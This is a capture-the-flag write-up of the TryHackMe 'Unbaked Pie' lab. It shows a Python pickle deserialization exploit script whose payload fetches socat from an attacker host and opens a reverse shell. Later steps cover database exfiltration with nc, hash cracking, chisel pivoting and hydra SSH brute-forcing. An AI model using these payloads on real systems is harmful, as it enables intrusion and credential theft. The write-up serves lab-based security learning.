# Unbaked Pie

## Introduction

Welcome to my another writeup! In this TryHackMe [Unbaked Pie](https://tryhackme.com/room/unbakedpie) room, you'll learn: Exploiting insecure deserialization in Python pickle library, pivoting and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: Docker root to Host ramsey](#privilege-escalation)**
4. **[Privilege Escalation: Host ramsey to Host oliver](#host-ramsey-to-host-oliver)**
5. **[Privilege Escalation: Host oliver to Host root](#host-oliver-to-host-root)**
6. **[Conclusion](#conclusion)**

## Background

> Don't over-baked your pie!
>  
> Difficulty: Medium

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|06:43:48]
└> export RHOSTS=10.10.49.15

┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|06:43:51]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT     STATE SERVICE    REASON         VERSION
5003/tcp open  filemaker? syn-ack ttl 62
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 12 Jan 2023 22:44:34 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=8nLLTsolHivoGxdVET7uPFwbGzlHtDH6fXf6tFHvKS36f9tAOQeMTpXJS5VuJUd0; expires=Thu, 11 Jan 2024 22:44:34 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|     <link href="/static/vendor/fontawesome-free/css/all.min.cs
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 12 Jan 2023 22:44:35 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=wu3wQFqBQXZL9gQsvRJPL6Ye8BM2OLhNrugJCNqQ3KoqMXZu6xvDMYkwRiKOrYvZ; expires=Thu, 11 Jan 2024 22:44:35 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|_    <link href="/static/vendor/fontawesome-free/css/all.min.cs
```

According to `rustscan` result, we have 1 port is opened:

Open Ports        | Service
------------------|------------------------
5003              | HTTP

### HTTP on Port 5003

**Adding a new hosts to `/etc/hosts`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|06:46:45]
└> echo "$RHOSTS unbaked-pie.thm" >> /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113064756.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113065529.png)

In here, we see there are some posts that we can view, a search bar, login, signup page.

**Let's enumerate usernames!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113072621.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113072643.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113072652.png)

- **Found username: `ramsey`, `wan`, `oliver`**

Now, we can try to search something:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113065655.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113065720.png)

When we clicked the "Search" button, it'll set a new cookie called `search_cookie`, which is encoded is base64.

> You can tell It's base64 encoded is because the last 2 characters have `=`, which is a padding in base64 encoding. 

**Let's try to decode it:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|06:51:26]
└> echo 'gASVCAAAAAAAAACMBHRlc3SULg==' | base64 -d | xxd
00000000: 8004 9508 0000 0000 0000 008c 0474 6573  .............tes
00000010: 7494 2e                                  t..
```

No clue what is it.

**Let's test SQL injection, XSS (Cross-Site Scripting), CSTI (Client-Side Template Injection), SSTI (Server-Side Template Injection) in the search box:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113070257.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113070312.png)

Nothing happened.

Let's move on.

**An interesting thing happened when we try to reach an non-existent article, it'll output an exception:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113070800.png)

> This happened is because the `DEBUG` variable is set to `True`in the Django settings file.

As you can see, it's using Python framework: "Django" version 3.1.2, Python version is 3.8.6.

**We can also see some source code of the web application:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113071228.png)

```py
    articles = Article.objects.all().order_by('-date')
    context = {
        'articles': articles
    }
    return render(request, 'homepage/index.html', context)

def article_details(request, slug):
    article = Article.objects.get(slug=slug)
    context = {
        'article': article
    }
    return render(request, 'homepage/post.html', context)

def about(request):
```

In here, we see there is a class called `Article`.

**Hmm... What if I try to reach an non-existent file?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113072349.png)

- **Found directory: `/admin/`, `/share`, `/search`, `/about`, `/accounts/`, `/static/*`, `/media/*`**

**The `/admin/` page looks interesting:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113072848.png)

So this is the Django admin interface.

**We can try to guess admin's password, like `admin:admin`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113072938.png)

Nope. Also no luck for default credentials.

Also, the GET parameter `next` maybe vulnerable to open redirect?

Let's go back to the home page.

**In here, let's try to login an account:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113073342.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113073347.png)

The "Sign Up" and "Forgot your password?" link is an empty anchor (`#`).

**Try to login an non-existent account:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113073605.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113073612.png)

**When we try to login an non-existent account, it'll have an error output, which is in JSON format:**

In that JSON data, we can see there is an `inactive` key, which has value: `This account is inactive.`. That being said, **maybe we can enumerate usernames via the response?**

**Now, let's signup an account and login:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113074007.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113074019.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113074211.png)

Umm... Is it broken?

Let's take a step back.

## Initial Foothold

**I have a feeling that we need to do something with the `search_cookie`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|07:45:17]
└> echo 'gASVCAAAAAAAAACMBHRlc3SULg==' | base64 -d | xxd                                    
00000000: 8004 9508 0000 0000 0000 008c 0474 6573  .............tes
00000010: 7494 2e                                  t..
```

**Why the decoded base64 string has some weird bytes?**

After putting different puzzles together, I think this is **a serialized Python object!**

**Let's write a python script to figure it out:**
```py
#!/usr/bin/env python3

import pickle
from base64 import b64decode
import logging

class Serialization:
    def __init__(self, cookie):
        self.cookie = cookie

    def decodeSearchCookie(self):
        base64Decoded = b64decode(self.cookie)
        logging.info(f'Base64 decoded: {base64Decoded}')

        with open('cookie.txt', 'wb') as file:
            file.write(base64Decoded)

    def deserializeObject(self):
        with open('cookie.txt', 'rb') as file:
            deserializedObject = pickle.load(file)

        logging.info(f'Deserialized: {deserializedObject}')

    def serializeObject(self, serializeContent):
        with open('serialized.txt', 'wb') as file:
            pickle.dump(serializeContent, file)

        logging.info(f'Before serialized: {serializeContent}')

        with open('serialized.txt', 'rb') as file:
            logging.info(f'Serialized: {file.read()}')

def main():
    logging.basicConfig(level=logging.INFO, format='[*] %(message)s')

    cookie = 'gASVCAAAAAAAAACMBHRlc3SULg=='

    serialization = Serialization(cookie)
    serialization.decodeSearchCookie()
    serialization.deserializeObject()

    serializeContent = 'test'
    serialization.serializeObject(serializeContent)

if __name__ == '__main__':
    main()
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|08:18:49]
└> python unpickle.py
[*] Base64 decoded: b'\x80\x04\x95\x08\x00\x00\x00\x00\x00\x00\x00\x8c\x04test\x94.'
[*] Deserialized: test
[*] Before serialized: test
[*] Serialized: b'\x80\x04\x95\x08\x00\x00\x00\x00\x00\x00\x00\x8c\x04test\x94.'
```

**Yep! The `search_cookie` indeed using Python library `pickle` to pickle (serialize).**

**Armed with above information, we can gain RCE (Remote Code Execution).**

**According to [HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization#pickle), we can use the `__reduce__` magic method to execute our OS command payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113082344.png)

**Let's do that!**
```py
#!/usr/bin/env python3

import pickle
from base64 import b64decode, b64encode
import logging
import os
import requests

class Exploit():
    def __reduce__(self):
        return (os.system,("ping -c 4 10.9.0.253 ",))

class Serialization:
    def __init__(self, cookie):
        self.cookie = cookie

    def decodeSearchCookie(self):
        base64Decoded = b64decode(self.cookie)
        logging.info(f'Base64 decoded: {base64Decoded}')

        with open('cookie.txt', 'wb') as file:
            file.write(base64Decoded)

    def deserializeObject(self):
        with open('cookie.txt', 'rb') as file:
            deserializedObject = pickle.load(file)

        logging.info(f'Deserialized: {deserializedObject}')

    def serializeObject(self, serializeContent, url):
        with open('serialized.txt', 'wb') as file:
            pickle.dump(serializeContent, file)

        logging.info(f'Before serialized: {serializeContent}')

        with open('serialized.txt', 'rb') as file:
            serialized = file.read()
            base64Encoded = b64encode(serialized)
            logging.info(f'Serialized: {serialized}')
            logging.info(f'Base64 encoded: {base64Encoded}')

            finalPayload = {
                'search_cookie': base64Encoded.decode('utf-8')
            }
            
            logging.info(f'Sending a GET request to /search, so we can trigger the payload...')
            requests.get(url, cookies=finalPayload)
            logging.info(f'Payload sent...')

def main():
    logging.basicConfig(level=logging.INFO, format='[*] %(message)s')

    cookie = 'gASVCAAAAAAAAACMBHRlc3SULg=='

    serialization = Serialization(cookie)
    # serialization.decodeSearchCookie()
    # serialization.deserializeObject()

    serializeContent = Exploit()
    url = 'http://unbaked-pie.thm:5003/search'
    serialization.serializeObject(serializeContent, url)

if __name__ == '__main__':
    main()
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|08:36:07]
└> python unpickle.py
[*] Before serialized: <__main__.Exploit object at 0x7f33eff30220>
[*] Serialized: b'\x80\x04\x950\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x15ping -c 4 10.9.0.253 \x94\x85\x94R\x94.'
[*] Base64 encoded: b'gASVMAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBVwaW5nIC1jIDQgMTAuOS4wLjI1MyCUhZRSlC4='
[*] Sending a GET request to /search, so we can trigger the payload...
[*] Payload sent...
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|08:36:55]
└> tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
08:36:57.449598 IP unbaked-pie.thm > 10.9.0.253: ICMP echo request, id 631, seq 1, length 64
08:36:57.449620 IP 10.9.0.253 > unbaked-pie.thm: ICMP echo reply, id 631, seq 1, length 64
08:36:58.449952 IP unbaked-pie.thm > 10.9.0.253: ICMP echo request, id 631, seq 2, length 64
08:36:58.449983 IP 10.9.0.253 > unbaked-pie.thm: ICMP echo reply, id 631, seq 2, length 64
08:36:59.449998 IP unbaked-pie.thm > 10.9.0.253: ICMP echo request, id 631, seq 3, length 64
08:36:59.450035 IP 10.9.0.253 > unbaked-pie.thm: ICMP echo reply, id 631, seq 3, length 64
08:37:00.450310 IP unbaked-pie.thm > 10.9.0.253: ICMP echo request, id 631, seq 4, length 64
08:37:00.450340 IP 10.9.0.253 > unbaked-pie.thm: ICMP echo reply, id 631, seq 4, length 64
```

Nice! We have code execution!

Let's get a reverse shell!

- Setup a listener:

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|08:38:11]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
2023/01/13 08:38:12 socat[70824] N opening character device "/dev/pts/1" for reading and writing
2023/01/13 08:38:12 socat[70824] N listening on AF=2 0.0.0.0:443
```

```shell
┌[root♥siunam]-(/opt/static-binaries/binaries/linux/x86_64)-[2023.01.13|08:39:07]-[git://master ✗]-
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Send the payload: (Generated from [revshells.com](https://www.revshells.com/))

```py
return (os.system,("wget http://10.9.0.253/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:443 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane ",))
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|08:40:46]
└> python unpickle.py
[*] Before serialized: <__main__.Exploit object at 0x7f420bbcc220>
[*] Serialized: b"\x80\x04\x95\xa7\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x8cwget http://10.9.0.253/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:443 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane \x94\x85\x94R\x94."
[*] Base64 encoded: b'gASVpwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjIx3Z2V0IGh0dHA6Ly8xMC45LjAuMjUzL3NvY2F0IC1PIC90bXAvc29jYXQ7Y2htb2QgK3ggL3RtcC9zb2NhdDsvdG1wL3NvY2F0IFRDUDoxMC45LjAuMjUzOjQ0MyBFWEVDOicvYmluL2Jhc2gnLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5lIJSFlFKULg=='
[*] Sending a GET request to /search, so we can trigger the payload...

```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|08:38:11]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
2023/01/13 08:38:12 socat[70824] N opening character device "/dev/pts/1" for reading and writing
2023/01/13 08:38:12 socat[70824] N listening on AF=2 0.0.0.0:443
                                                                2023/01/13 08:41:04 socat[70824] N accepting connection from AF=2 10.10.49.15:59318 on AF=2 10.9.0.253:443
                                                               2023/01/13 08:41:04 socat[70824] N starting data transfer loop with FDs [5,5] and [7,7]
                                           root@8b39a559b296:/home# 
root@8b39a559b296:/home# export TERM=xterm-256color
root@8b39a559b296:/home# stty rows 22 columns 107
root@8b39a559b296:/home# whoami;hostname;id;ip a
root
8b39a559b296
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
root@8b39a559b296:/home# ^C
root@8b39a559b296:/home# 
```

I'm root **inside a docker container**!

## Privilege Escalation

### Docker root to host ramsey

Let's do some basic enumerations!

**Found `.dockerenv` file in `/`:**
```
root@8b39a559b296:/home# ls -lah /
total 76K
drwxr-xr-x   1 root root 4.0K Oct  3  2020 .
drwxr-xr-x   1 root root 4.0K Oct  3  2020 ..
-rwxr-xr-x   1 root root    0 Oct  3  2020 .dockerenv
[...]
```

This indicates that we're inside a docker container.

**Found SQLite database file in `/home/site`:**
```shell
root@8b39a559b296:/home/site# ls -lah
total 184K
drwxrwxr-x 1 root root 4.0K Oct  3  2020 .
drwxr-xr-x 1 root root 4.0K Oct  3  2020 ..
drwxrwxr-x 1 root root 4.0K Oct  3  2020 account
drwxrwxr-x 8 root root 4.0K Oct  3  2020 assets
drwxrwxr-x 1 root root 4.0K Oct  3  2020 bakery
-rw-r--r-- 1 root root 148K Oct  3  2020 db.sqlite3
drwxrwxr-x 1 root root 4.0K Oct  3  2020 homepage
-rwxrwxr-x 1 root root  662 Oct  3  2020 manage.py
drwxrwxr-x 2 root root 4.0K Oct  3  2020 media
drwxrwxr-x 3 root root 4.0K Oct  3  2020 templates
```

**Let's transfer it!**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|08:49:34]
└> nc -lnvp 4444 > db.sqlite3

root@8b39a559b296:/home/site# nc 10.9.0.253 4444 < db.sqlite3
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|08:50:30]
└> sqlite3 db.sqlite3 
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
auth_group                  django_admin_log          
auth_group_permissions      django_content_type       
auth_permission             django_migrations         
auth_user                   django_session            
auth_user_groups            homepage_article          
auth_user_user_permissions
```

**Table `auth_user`:**
```shell
sqlite> SELECT username, password, is_superuser FROM auth_user;
aniqfakhrul|pbkdf2_sha256$216000${Redacted}|1
testing|pbkdf2_sha256$216000${Redacted}|0
ramsey|pbkdf2_sha256$216000${Redacted}|0
oliver|pbkdf2_sha256$216000${Redacted}|0
wan|pbkdf2_sha256$216000${Redacted}|0
```

**User `aniqfakhrul` is a superuser, let's crack it's password hash:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|08:58:32]
└> echo 'pbkdf2_sha256$216000${Redacted}' > aniqfakhrul.hash

┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|08:58:39]
└> hashcat -m 10000 aniqfakhrul.hash /usr/share/wordlists/rockyou.txt
[...]
```

However, it seems like we couldn't crack that hash.

**Bash history file:**
```shell
root@8b39a559b296:/home# cat /root/.bash_history | sort |uniq

./check-config.sh 
apt autoremove openssh-client
apt install grub-update
apt install nano
apt install vi
apt install vim
apt remove --purge autoremove open-ssh*
apt remove --purge autoremove openssh-*
apt remove --purge autoremove openssh=*
apt remove --purge ssh
apt update
apt-get install --reinstall grub
cd /tmp
cd bakery/
cd site/
chmod +x check-config.sh
clear
exit
grub-update
ifconfig
ip addr
ls
nano /etc/default/grub
nano settings.py 
nc
ssh
ssh 172.17.0.1
ssh 172.17.0.2
ssh ramsey@172.17.0.1
vi /etc/default/grub
wget https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh
```

**As you can see, there is a SSH command, which connecting to `172.17.0.1` (Host) as user `ramsey`.**

**Let's use `nc` to scan all open ports:**
```shell
root@8b39a559b296:/home# nc -zv 172.17.0.1 1-65535
ip-172-17-0-1.eu-west-1.compute.internal [172.17.0.1] 5003 (?) open
ip-172-17-0-1.eu-west-1.compute.internal [172.17.0.1] 22 (ssh) open
```

- Host `172.17.0.1` open port: `22`

> Note: The port `5003` is opened because the web application is listening on **all interfaces**.

**Let's use `chisel` to do port forwarding:**
```shell
┌[root♥siunam]-(/opt/chisel)-[2023.01.13|09:20:16]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

root@8b39a559b296:/home# wget http://10.9.0.253/chiselx64 -O /tmp/chisel;chmod +x /tmp/chisel
```

```shell
┌[root♥siunam]-(/opt/chisel)-[2023.01.13|09:21:51]
└> ./chiselx64 server --reverse -p 8888
2023/01/13 09:21:55 server: Reverse tunnelling enabled
2023/01/13 09:21:55 server: Fingerprint xOiq4AJ7VODnEu1iXNOYHisx53zzaEeHiuqwLjpGngA=
2023/01/13 09:21:55 server: Listening on http://0.0.0.0:8888

root@8b39a559b296:/home# /tmp/chisel client 10.9.0.253:8888 R:2222:172.17.0.1:22
2023/01/13 01:37:54 client: Connecting to ws://10.9.0.253:8888
2023/01/13 01:37:55 client: Connected (Latency 211.976805ms)
```

Then, we can communicate to `172.17.0.1`.

**Since we know there is a user called `ramsey`, we can try to brute force SSH with `hydra`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|09:38:04]
└> hydra -l 'ramsey' -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.1 -s 2222
[...]
[2222][ssh] host: 172.17.0.1   login: ramsey   password: {Redacted}
```

Found user `ramsey`' password!

**Let's SSH into user `ramsey`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|09:40:05]
└> ssh ramsey@172.17.0.1 -p 2222
ramsey@172.17.0.1's password: 
ramsey@unbaked:~$ whoami;hostname;id;ip a
ramsey
unbaked
uid=1001(ramsey) gid=1001(ramsey) groups=1001(ramsey)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:9d:2a:2d:05:b3 brd ff:ff:ff:ff:ff:ff
    inet 10.10.49.15/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::9d:2aff:fe2d:5b3/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:40:ad:94:49 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:40ff:fead:9449/64 scope link 
       valid_lft forever preferred_lft forever
5: vethce88f61@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether ce:10:16:87:86:01 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::cc10:16ff:fe87:8601/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `ramsey`!

**user.txt:**
```shell
ramsey@unbaked:~$ cat /home/ramsey/user.txt 
THM{Redacted}
```

### Host ramsey to host oliver

Again, enumerate.

**Sudo permission:**
```shell
ramsey@unbaked:~$ sudo -l
[sudo] password for ramsey: 
Matching Defaults entries for ramsey on unbaked:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ramsey may run the following commands on unbaked:
    (oliver) /usr/bin/python /home/ramsey/vuln.py
```

**User `ramsey` can run `/usr/bin/python /home/ramsey/vuln.py` as user `oliver`.**

**System users:**
```shell
ramsey@unbaked:~$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
ramsey:x:1001:1001::/home/ramsey:/bin/bash
oliver:x:1002:1002::/home/oliver:/bin/bash

ramsey@unbaked:~$ ls -lah /home
total 16K
drwxr-xr-x  4 root   root   4.0K Oct  3  2020 .
drwxr-xr-x 23 root   root   4.0K Oct  3  2020 ..
drwxr-xr-x  3 oliver oliver 4.0K Oct  3  2020 oliver
drwxr-xr-x  5 ramsey ramsey 4.0K Oct  6  2020 ramsey
```

- Found system user: `oliver`, `ramsey`

**Listening ports:**
```shell
ramsey@unbaked:~$ netstat -tunlp
[...]
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:36829         0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::5003                 :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -   
```

- Found local loopback listening port: `36829`

**User `ramsey` home directory:**
```shell
ramsey@unbaked:~$ ls -lah
total 48K
drwxr-xr-x 5 ramsey ramsey 4.0K Oct  6  2020 .
drwxr-xr-x 4 root   root   4.0K Oct  3  2020 ..
-rw------- 1 root   root      1 Oct  5  2020 .bash_history
-rw-r--r-- 1 ramsey ramsey 3.7K Oct  3  2020 .bashrc
drwx------ 3 ramsey ramsey 4.0K Oct  3  2020 .cache
drwx------ 4 ramsey ramsey 4.0K Oct  3  2020 .local
drwxrwxr-x 2 ramsey ramsey 4.0K Oct  3  2020 .nano
-rwxrw-r-- 1 ramsey ramsey 1.7K Oct  3  2020 payload.png
-rw-r--r-- 1 ramsey ramsey  655 Oct  3  2020 .profile
-rw-r--r-- 1 root   root     38 Oct  6  2020 user.txt
-rw-r--r-- 1 root   ramsey 4.3K Oct  3  2020 vuln.py
```

**`vuln.py`:**
```py
ramsey@unbaked:~$ cat vuln.py 
#!/usr/bin/python
# coding=utf-8

try:
    from PIL import Image
except ImportError:
    import Image
import pytesseract
import sys
import os
import time


#Header
def header():
	banner = '''\033[33m                                             
				      (
				       )
			          __..---..__
			      ,-='  /  |  \  `=-.
			     :--..___________..--;
	 		      \.,_____________,./
		 

██╗███╗   ██╗ ██████╗ ██████╗ ███████╗██████╗ ██╗███████╗███╗   ██╗████████╗███████╗
██║████╗  ██║██╔════╝ ██╔══██╗██╔════╝██╔══██╗██║██╔════╝████╗  ██║╚══██╔══╝██╔════╝
██║██╔██╗ ██║██║  ███╗██████╔╝█████╗  ██║  ██║██║█████╗  ██╔██╗ ██║   ██║   ███████╗
██║██║╚██╗██║██║   ██║██╔══██╗██╔══╝  ██║  ██║██║██╔══╝  ██║╚██╗██║   ██║   ╚════██║
██║██║ ╚████║╚██████╔╝██║  ██║███████╗██████╔╝██║███████╗██║ ╚████║   ██║   ███████║
╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝
\033[m'''
    	return banner

#Function Instructions
def instructions():
	print "\n\t\t\t",9 * "-" , "WELCOME!" , 9 * "-"
	print "\t\t\t","1. Calculator"
	print "\t\t\t","2. Easy Calculator"
	print "\t\t\t","3. Credits"
	print "\t\t\t","4. Exit"
	print "\t\t\t",28 * "-"

def instructions2():
	print "\n\t\t\t",9 * "-" , "CALCULATOR!" , 9 * "-"
	print "\t\t\t","1. Add"
	print "\t\t\t","2. Subtract"
	print "\t\t\t","3. Multiply"
	print "\t\t\t","4. Divide"
	print "\t\t\t","5. Back"
	print "\t\t\t",28 * "-"
	
def credits():
	print "\n\t\tHope you enjoy learning new things  - Ch4rm & H0j3n\n"
	
# Function Arithmetic

# Function to add two numbers  
def add(num1, num2): 
    return num1 + num2 
  
# Function to subtract two numbers  
def subtract(num1, num2): 
    return num1 - num2 
  
# Function to multiply two numbers 
def multiply(num1, num2): 
    return num1 * num2 
  
# Function to divide two numbers 
def divide(num1, num2): 
    return num1 / num2 
# Main    	
if __name__ == "__main__":
	print header()
	
	#Variables
	OPTIONS = 0
	OPTIONS2 = 0
	TOTAL = 0
	NUM1 = 0
	NUM2 = 0

	while(OPTIONS != 4):
		instructions()
		OPTIONS = int(input("\t\t\tEnter Options >> "))
	        print "\033c"
		if OPTIONS == 1:
			instructions2()
			OPTIONS2 = int(input("\t\t\tEnter Options >> "))
			print "\033c"
			if OPTIONS2 == 5:
				continue
			else:
				NUM1 = int(input("\t\t\tEnter Number1 >> "))
